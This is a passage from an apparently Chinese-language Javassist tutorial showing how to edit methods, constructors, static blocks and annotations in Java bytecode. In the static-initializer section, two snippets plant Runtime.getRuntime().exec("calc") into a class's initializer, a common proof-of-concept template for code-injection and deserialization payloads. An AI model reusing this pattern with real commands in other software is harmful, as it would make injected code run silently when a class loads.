被包装的方法必须拥有`Object method(Object[] params)`形式的签名</span><span class="token comment">// 当ctMethod拥有`int test(int a)`形式的签名时</span><span class="token comment">// 包装后等效于{ return (int)from(new Object[] { new Integer(a) }); }</span>ctMethod<span class="token punctuation">.</span><span class="token function">setWrappedBody</span><span class="token punctuation">(</span>ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredMethod</span><span class="token punctuation">(</span><span class="token string">"from"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>方法体增加try-catch</p><pre class="language-java" data-language="java"><code class="language-java">ctMethod<span class="token punctuation">.</span><span class="token function">addCatch</span><span class="token punctuation">(</span><span class="token string">"{ $e.printStackTrace(); return; }"</span><span class="token punctuation">,</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.lang.RuntimeException"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctMethod<span class="token punctuation">.</span><span class="token function">addCatch</span><span class="token punctuation">(</span><span class="token string">"{ e.printStackTrace(); return; }"</span><span class="token punctuation">,</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.lang.RuntimeException"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>方法体增加本地变量<br>插入的代码将被包裹在{代码块}中，因此insertAfter()中的代码无法访问insertBefore()中的变量<br>可以通过此方法将变量添加为本地变量，作用域为整个方法体，使用前必须初始化</p><pre class="language-java" data-language="java"><code class="language-java">ctMethod<span class="token punctuation">.</span><span class="token function">addLocalVariable</span><span class="token punctuation">(</span><span class="token string">"time"</span><span class="token punctuation">,</span> <span class="token class-name">CtClass</span><span class="token punctuation">.</span>longType<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>方法体插入代码</p><pre class="language-java" data-language="java"><code class="language-java">ctMethod<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span><span class="token string">"{ time = System.nanoTime(); }"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctMethod<span class="token punctuation">.</span><span class="token function">insertAfter</span><span class="token punctuation">(</span><span class="token string">"{ System.out.println(System.nanoTime() - time); }"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctMethod<span class="token punctuation">.</span><span class="token function">insertAfter</span><span class="token punctuation">(</span><span class="token string">"{ System.out.println(\"finally\"); }"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctMethod<span class="token punctuation">.</span><span class="token function">insertAfter</span><span class="token punctuation">(</span><span class="token string">"{ System.out.println(\"finally\"); }"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ctClass.isKotlin()</span>ctMethod<span class="token punctuation">.</span><span class="token function">insertAt</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token string">"{ System.out.println(\"inserted\"); }"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="Constructor"><a href="#Constructor" class="headerlink" title="Constructor"></a>Constructor</h3><p>新增构造方法</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtConstructor</span> ctConstructor <span class="token operator">=</span> <span class="token class-name">CtNewConstructor</span><span class="token punctuation">.</span><span class="token function">defaultConstructor</span><span class="token punctuation">(</span>ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtConstructor</span> ctConstructor <span class="token operator">=</span> <span class="token class-name">CtNewConstructor</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token string">"public Test(int age) { this.age = age; }"</span><span class="token punctuation">,</span> ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtConstructor</span> ctConstructor <span class="token operator">=</span> <span class="token class-name">CtNewConstructor</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CtClass</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token class-name">CtClass</span><span class="token punctuation">.</span>intType <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtConstructor</span> ctConstructor <span class="token operator">=</span> <span class="token class-name">CtNewConstructor</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CtClass</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token class-name">CtClass</span><span class="token punctuation">.</span>intType <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token string">"{ this.age = $1; }"</span><span class="token punctuation">,</span> ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span>ctClass<span class="token punctuation">.</span><span class="token function">addConstructor</span><span class="token punctuation">(</span>ctConstructor<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>修改已有构造方法</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtConstructor</span> ctConstructor <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">CtConstructor</span> ctConstructor <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getDeclaredConstructor</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CtClass</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> <span class="token class-name">CtClass</span><span class="token punctuation">.</span>intType <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>复制已有构造方法</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtConstructor</span> ctConstructor2 <span class="token operator">=</span> <span class="token class-name">CtNewConstructor</span><span class="token punctuation">.</span><span class="token function">copy</span><span class="token punctuation">(</span>ctConstructor<span class="token punctuation">,</span> ctClass<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctConstructor2<span class="token punctuation">.</span><span class="token function">addParameter</span><span class="token punctuation">(</span><span class="token class-name">CtClass</span><span class="token punctuation">.</span>intType<span class="token punctuation">)</span><span class="token punctuation">;</span>ctClass<span class="token punctuation">.</span><span class="token function">addConstructor</span><span class="token punctuation">(</span>ctConstructor2<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>设置异常类型</p><pre class="language-java" data-language="java"><code class="language-java">ctConstructor<span class="token punctuation">.</span><span class="token function">setExceptionTypes</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CtClass</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">{</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.lang.RuntimeException"</span><span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>修改方法签名<br>详见方法中的修改方法签名</p><pre class="language-java" data-language="java"><code class="language-java">ctConstructor<span class="token punctuation">.</span><span class="token function">setGenericSignature</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">MethodSignature</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>设置修饰符</p><pre class="language-java" data-language="java"><code class="language-java">ctConstructor<span class="token punctuation">.</span><span class="token function">setModifiers</span><span class="token punctuation">(</span><span class="token class-name">Modifier</span><span class="token punctuation">.</span><span class="token constant">PRIVATE</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>增加参数</p><pre class="language-java" data-language="java"><code class="language-java">ctConstructor<span class="token punctuation">.</span><span class="token function">insertParameter</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctConstructor<span class="token punctuation">.</span><span class="token function">addParameter</span><span class="token punctuation">(</span>pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.lang.String"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>设置构造方法体</p><pre class="language-java" data-language="java"><code class="language-java">ctConstructor<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"{ super(); }"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>复制构造方法体</p><pre class="language-java" data-language="java"><code class="language-java">ctConstructor<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span>ctConstructor2<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>设置构造方法体与委派方法</p><pre class="language-java" data-language="java"><code class="language-java">ctConstructor<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"{ $proceed($$); }"</span><span class="token punctuation">,</span> <span class="token string">"this"</span><span class="token punctuation">,</span> <span class="token string">"from"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>构造方法体增加try-catch</p><pre class="language-java" data-language="java"><code class="language-java">ctConstructor<span class="token punctuation">.</span><span class="token function">addCatch</span><span class="token punctuation">(</span><span class="token string">"{ $e.printStackTrace(); return; }"</span><span class="token punctuation">,</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.lang.RuntimeException"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctConstructor<span class="token punctuation">.</span><span class="token function">addCatch</span><span class="token punctuation">(</span><span class="token string">"{ e.printStackTrace(); return; }"</span><span class="token punctuation">,</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"java.lang.RuntimeException"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"e"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>构造方法体增加本地变量<br>插入的代码将被包裹在{代码块}中，因此insertAfter()中的代码无法访问insertBefore()中的变量<br>可以通过此方法将变量添加为本地变量，作用域为整个方法体，使用前必须初始化</p><pre class="language-java" data-language="java"><code class="language-java">ctConstructor<span class="token punctuation">.</span><span class="token function">addLocalVariable</span><span class="token punctuation">(</span><span class="token string">"time"</span><span class="token punctuation">,</span> <span class="token class-name">CtClass</span><span class="token punctuation">.</span>longType<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>构造方法体插入代码</p><pre class="language-java" data-language="java"><code class="language-java">ctConstructor<span class="token punctuation">.</span><span class="token function">insertBefore</span><span class="token punctuation">(</span><span class="token string">"{ time = System.nanoTime(); }"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// time = System.nanoTime(); super();</span>ctConstructor<span class="token punctuation">.</span><span class="token function">insertBeforeBody</span><span class="token punctuation">(</span><span class="token string">"{ time = System.nanoTime(); }"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// super(); time = System.nanoTime();</span>ctConstructor<span class="token punctuation">.</span><span class="token function">insertAfter</span><span class="token punctuation">(</span><span class="token string">"{ System.out.println(System.nanoTime() - time); }"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctConstructor<span class="token punctuation">.</span><span class="token function">insertAfter</span><span class="token punctuation">(</span><span class="token string">"{ System.out.println(\"finally\"); }"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctConstructor<span class="token punctuation">.</span><span class="token function">insertAfter</span><span class="token punctuation">(</span><span class="token string">"{ System.out.println(\"finally\"); }"</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ctClass.isKotlin()</span>ctConstructor<span class="token punctuation">.</span><span class="token function">insertAt</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token string">"{ System.out.println(\"inserted\"); }"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="静态代码块"><a href="#静态代码块" class="headerlink" title="静态代码块"></a>静态代码块</h3><p>修改已有静态代码块（如不存在则返回null）</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtConstructor</span> ctConstructor <span class="token operator">=</span>  ctClass<span class="token punctuation">.</span><span class="token function">getClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>新增静态代码块（如存在则返回已有静态代码块）</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtConstructor</span> ctConstructor <span class="token operator">=</span>  ctClass<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>静态代码块其他使用方式与构造方法相同</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtConstructor</span> ctConstructor <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>ctConstructor<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"Runtime.getRuntime().exec(\"calc\");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>另外一种方式：</p><p>将静态代码块作为静态方法添加到类中，然后在类的静态初始方法 <strong><clinit></clinit></strong> 中调用这个静态方法</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">CtMethod</span> clinit <span class="token operator">=</span> <span class="token class-name">CtNewMethod</span><span class="token punctuation">.</span><span class="token function">make</span><span class="token punctuation">(</span><span class="token string">"public static void $clinit() {Runtime.getRuntime().exec(\"calc\");}"</span><span class="token punctuation">,</span> ctClass<span class="token punctuation">)</span><span class="token punctuation">;</span>ctClass<span class="token punctuation">.</span><span class="token function">addMethod</span><span class="token punctuation">(</span>clinit<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="注解"><a href="#注解" class="headerlink" title="注解"></a>注解</h3><p>得到注解<br>得到类注解</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Deprecated</span> annotation <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Deprecated</span><span class="token punctuation">)</span>ctClass<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">Deprecated</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Deprecated</span> annotation <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Deprecated</span><span class="token punctuation">)</span>ctClass<span class="token punctuation">.</span><span class="token function">getAnnotations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>得到属性注解</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Deprecated</span> annotation <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Deprecated</span><span class="token punctuation">)</span>ctField<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">Deprecated</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Deprecated</span> annotation <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Deprecated</span><span class="token punctuation">)</span>ctField<span class="token punctuation">.</span><span class="token function">getAnnotations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>得到方法注解</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Deprecated</span> annotation <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Deprecated</span><span class="token punctuation">)</span>ctMethod<span class="token punctuation">.</span><span class="token function">getAnnotation</span><span class="token punctuation">(</span><span class="token class-name">Deprecated</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">Deprecated</span> annotation <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Deprecated</span><span class="token punctuation">)</span>ctMethod<span class="token punctuation">.</span><span class="token function">getAnnotations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>得到参数注解</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Deprecated</span> annotation <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Deprecated</span><span class="token punctuation">)</span>ctMethod<span class="token punctuation">.</span><span class="token function">getParameterAnnotations</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span></code></pre><p>添加注解<br>获得ClassFile与ConstPool</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ClassFile</span> classFile <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">getClassFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">ConstPool</span> constPool <span class="token operator">=</span> classFile<span class="token punctuation">.</span><span class="token function">getConstPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>创建注解</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Annotation</span> annotation <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Annotation</span><span class="token punctuation">(</span><span class="token string">"java.lang.Deprecated"</span><span class="token punctuation">,</span> constPool<span class="token punctuation">)</span><span class="token punctuation">;</span>annotation<span class="token punctuation">.</span><span class="token function">addMemberValue</span><span class="token punctuation">(</span><span class="token string">"since"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">StringMemberValue</span><span class="token punctuation">(</span><span class="token string">"1.0.0"</span><span class="token punctuation">,</span> constPool<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>创建注解属性</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">AnnotationsAttribute</span> annotationsAttribute <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">AnnotationsAttribute</span><span class="token punctuation">(</span>constPool<span class="token punctuation">,</span> <span class="token class-name">AnnotationsAttribute</span><span class="token punctuation">.</span>visibleTag<span class="token punctuation">)</span><span class="token punctuation">;</span>annotationsAttribute<span class="token punctuation">.</span><span class="token function">addAnnotation</span><span class="token punctuation">(</span>annotation<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>添加类注解</p><pre class="language-java" data-language="java"><code class="language-java">classFile<span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span>annotationsAttribute<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>添加属性注解</p><pre class="language-java" data-language="java"><code class="language-java">ctField<span class="token punctuation">.</span><span class="token function">getFieldInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span>annotationsAttribute<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>添加方法注解</p><pre class="language-java" data-language="java"><code class="language-java">ctMethod<span class="token punctuation">.</span><span class="token function">getMethodInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span>annotationsAttribute<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>创建参数注解属性</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Annotation</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> annotations <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Annotation</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>annotations<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> annotation<span class="token punctuation">;</span><span class="token class-name">ParameterAnnotationsAttribute</span> parameterAnnotationsAttribute <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ParameterAnnotationsAttribute</span><span class="token punctuation">(</span>constPool<span class="token punctuation">,</span> <span class="token class-name">ParameterAnnotationsAttribute</span><span class="token punctuation">.</span>visibleTag<span class="token punctuation">)</span><span class="token punctuation">;</span>parameterAnnotationsAttribute<span class="token punctuation">.</span><span class="token function">setAnnotations</span><span class="token punctuation">(</span>annotations<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>添加参数注解</p><pre class="language-java" data-language="java"><code class="language-java">ctMethod<span class="token punctuation">.</span><span class="token function">getMethodInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">addAttribute</span><span class="token punctuation">(</span>parameterAnnotationsAttribute<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h3 id="修改方法体"><a href="#修改方法体" class="headerlink" title="修改方法体"></a>修改方法体</h3><p>修改方法调用</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">ExprEditor</span> editor <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ExprEditor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token class-name">MethodCall</span> m<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span> <span class="token punctuation">{</span><span class="token class-name">String</span> call <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">getClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"#"</span> <span class="token operator">+</span> m<span class="token punctuation">.</span><span class="token function">getMethodName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>call<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.io.PrintStream#print"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>m<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"{ $_ = $proceed($1 + \"\\n\"); }"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span>ctMethod<span class="token punctuation">.</span><span class="token function">instrument</span><span class="token punctuation">(</span>editor<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//ctConstructor.instrument(editor);</span><span class="token comment">//ctClass.instrument(editor);</span></code></pre><p>修改新建对象</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token class-name">NewExpr</span> e<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">getClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.util.ArrayList"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"{ $_ = new java.util.LinkedList(); }"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>修改新建数组</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token class-name">NewArray</span> a<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span> <span class="token punctuation">{</span><span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>a<span class="token punctuation">.</span><span class="token function">getComponentType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"int"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>a<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"{ $_ = new int[$1 + 1]; }"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NotFoundException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>修改调用构造方法</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token class-name">ConstructorCall</span> c<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span> <span class="token punctuation">{</span><span class="token class-name">String</span> call <span class="token operator">=</span> c<span class="token punctuation">.</span><span class="token function">getClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"#"</span> <span class="token operator">+</span> c<span class="token punctuation">.</span><span class="token function">getMethodName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>call<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"com.github.test.Test#this"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>c<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"{ super(); }"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>修改属性读写</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token class-name">FieldAccess</span> f<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span> <span class="token punctuation">{</span><span class="token class-name">String</span> field <span class="token operator">=</span> f<span class="token punctuation">.</span><span class="token function">getClassName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"."</span> <span class="token operator">+</span> f<span class="token punctuation">.</span><span class="token function">getFieldName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>field<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.System.out"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>f<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token string">"{ $_ = System.err; }"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>修改实例判断</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Override</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">edit</span><span class="token punctuation">(</span><span class="token class-name">Instanceof</span> i<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CannotCompileException</span> <span class="token punctuation">{</span><span class="token keyword">try</span> <span class="token punctuation">{</span><span class="token keyword">if</span> <span class="token punctuation">(</span>i<span class="token punctuation">.</span><span class="token function">getType</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span><span class="token string">"java.lang.Long"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>i<span class="token punctuation">.</span><span class="token 